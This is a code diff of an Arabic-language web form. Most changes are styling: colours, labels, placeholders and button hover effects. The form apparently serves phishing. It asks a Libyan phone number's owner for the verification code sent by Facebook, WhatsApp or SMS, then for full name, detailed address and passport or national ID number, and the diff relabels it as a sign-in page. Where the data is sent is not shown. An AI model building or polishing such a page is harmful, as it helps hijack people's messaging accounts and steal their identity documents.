@@ -10,7 +10,7 @@
       background: linear-gradient(to bottom, #004c97, #ffffff);
       margin: 0;
       padding: 0;
-      color: #333;
+      color: #004c97;
     }
 
     .container {
@@ -32,13 +32,31 @@
       display: block;
     }
 
+    h3 {
+      color: #004c97;
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      margin: 10px 0 5px;
+      font-weight: bold;
+      color: brown;
+    }
+
     input, button, select {
       width: 100%;
       padding: 12px;
-      margin: 10px 0;
+      margin-bottom: 15px;
       border: 1px solid #ccc;
       border-radius: 10px;
       font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    /* لون placeholder الذهبي */
+    input::placeholder {
+      color: goldenrod;
     }
 
     button {
@@ -46,19 +64,25 @@
       color: white;
       font-weight: bold;
       cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #003b78;
     }
 
     .toast {
       position: fixed;
-      bottom: 20px;
+      top: 30px;
       right: 20px;
-      background: #ffc107;
+      background: #d9ecff;
       padding: 10px 20px;
       border-radius: 10px;
-      color: #000;
+      color: #004c97;
       font-weight: bold;
       display: none;
       z-index: 999;
+      border: 1px solid #004c97;
     }
   </style>
 </head>
@@ -66,24 +90,28 @@
   <div class="container">
     <!-- المرحلة 1: إدخال رقم الهاتف -->
     <div class="card active" id="step1">
-      <h3>أدخل رقم هاتفك الليبي</h3>
+      <h3>سجل الدخول</h3>
+      <label for="phone">رقم الهاتف</label>
       <input type="text" id="phone" placeholder="مثال: 0912345678" maxlength="10">
       <button onclick="handleStep1()">إرسال رمز التأكيد</button>
     </div>
 
     <!-- المرحلة 2: إدخال كود التأكيد -->
     <div class="card" id="step2">
-      <h3>أدخل كود التأكيد الذي وصلك من فيسبوك أو واتساب</h3>
+      <label for="code">الكود أشعار فيسبوك او واتساب أو رسالة نصية</label>
       <input type="text" id="code" placeholder="أدخل الكود هنا">
-      <button onclick="handleStep2()">تأكيد الكود</button>
+      <button onclick="handleStep2()">ارسال الكود للتأكيد</button>
     </div>
 
     <!-- المرحلة 3: البيانات الإضافية -->
     <div class="card" id="step3">
       <h3>معلوماتك الشخصية</h3>
+      <label for="fullname">الاسم بالكامل</label>
       <input type="text" id="fullname" placeholder="الاسم بالكامل">
-      <input type="text" id="address" placeholder="العنوان">
-      <input type="text" id="idNumber" placeholder="رقم جواز السفر أو البطاقة الوطنية">
+      <label for="address">العنوان</label>
+      <input type="text" id="address" placeholder="العنوان بالتفصيل">
+      <label for="idNumber">رقم جواز السفر أو البطاقة</label>
+      <input type="text" id="idNumber" placeholder="مثال: A123456 أو 1234567">
       <button onclick="submitAll()">إرسال جميع البيانات</button>
     </div>
   </div>
@@ -101,7 +129,7 @@
       toast.style.display = 'block';
       setTimeout(() => {
         toast.style.display = 'none';
-      }, 4000);
+      }, 5000); // 5 ثواني
     }
 
     function handleStep1() {
@@ -126,7 +154,7 @@
         document.getElementById('step2').classList.remove('active');
         document.getElementById('step3').classList.add('active');
         submitAll();
-      }, 4000);
+      }, 5000);
     }
 
     function submitAll() {
